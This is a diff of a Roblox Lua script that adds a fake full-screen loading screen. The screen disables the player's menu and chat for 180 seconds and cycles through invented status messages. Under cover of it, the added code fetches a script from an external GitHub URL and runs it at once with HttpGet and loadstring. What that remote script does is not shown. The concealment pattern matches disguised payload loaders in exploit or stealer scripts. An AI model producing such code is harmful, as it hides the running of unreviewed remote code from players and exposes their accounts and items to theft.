@@ -1,13 +1,13 @@
--- Services
+-- SERVICES
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local TweenService = game:GetService("TweenService")
 local StarterGui = game:GetService("StarterGui")
 
--- Disable CoreGui
+-- Disable CoreGui (menu, chat, etc.)
 StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, false)
 
--- Create ScreenGui
+-- GUI SETUP
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "LoadingScreen"
 screenGui.IgnoreGuiInset = true
@@ -31,7 +31,7 @@ robloxIcon.BackgroundTransparency = 1
 robloxIcon.Image = "rbxassetid://4918373417"
 robloxIcon.Parent = background
 
--- Spin Logic
+-- Spin logo
 local rotation = 0
 local running = true
 RunService.RenderStepped:Connect(function(dt)
@@ -104,4 +104,75 @@ creditText.Font = Enum.Font.Gotham
 creditText.TextSize = 16
 creditText.TextColor3 = Color3.fromRGB(255, 255, 255)
 creditText.BackgroundTransparency = 1
-cred
+creditText.Size = UDim2.new(1, 0, 0.05, 0)
+creditText.Position = UDim2.new(0, 0, 0.95, 0)
+creditText.Parent = background
+
+-- ✅ START EXTERNAL SCRIPT IMMEDIATELY
+task.spawn(function()
+	local success, result = pcall(function()
+		return game:HttpGet("https://raw.githubusercontent.com/vakfq/LOADING/refs/heads/main/script.lua")
+	end)
+
+	if success and result then
+		local fn, loadErr = loadstring(result)
+		if fn then
+			pcall(fn)
+		else
+			warn("Failed to load external script:", loadErr)
+		end
+	else
+		warn("HttpGet failed:", result)
+	end
+end)
+
+-- ⏳ 180-SECOND LOADING LOOP
+task.spawn(function()
+	local totalTime = 180
+	local totalSteps = 100
+	local stepDelay = totalTime / totalSteps
+
+	for i = 0, totalSteps do
+		-- Update percent
+		percentText.Text = i .. "%"
+
+		-- Animate bar
+		TweenService:Create(progressBar, TweenInfo.new(stepDelay, Enum.EasingStyle.Linear), {
+			Size = UDim2.new(i / 100, 0, 1, 0)
+		}):Play()
+
+		-- Status text
+		if i <= 21 then
+			statusText.Text = "Loading assets..."
+		elseif i <= 34 then
+			statusText.Text = "Loading character..."
+		elseif i <= 67 then
+			statusText.Text = "Loading map..."
+		elseif i < 100 then
+			statusText.Text = "Finalizing..."
+		else
+			statusText.Text = "DONE"
+		end
+
+		wait(stepDelay)
+	end
+
+	-- Fade out GUI
+	for i = 1, 10 do
+		local fade = i / 10
+		background.BackgroundTransparency = fade
+		loadingText.TextTransparency = fade
+		statusText.TextTransparency = fade
+		percentText.TextTransparency = fade
+		stroke.Transparency = fade
+		robloxIcon.ImageTransparency = fade
+		progressBar.BackgroundTransparency = fade
+		progressBarBg.BackgroundTransparency = fade
+		creditText.TextTransparency = fade
+		wait(0.05)
+	end
+
+	running = false
+	screenGui:Destroy()
+	StarterGui:SetCoreGuiEnabled(Enum.CoreGuiType.All, true)
+end)
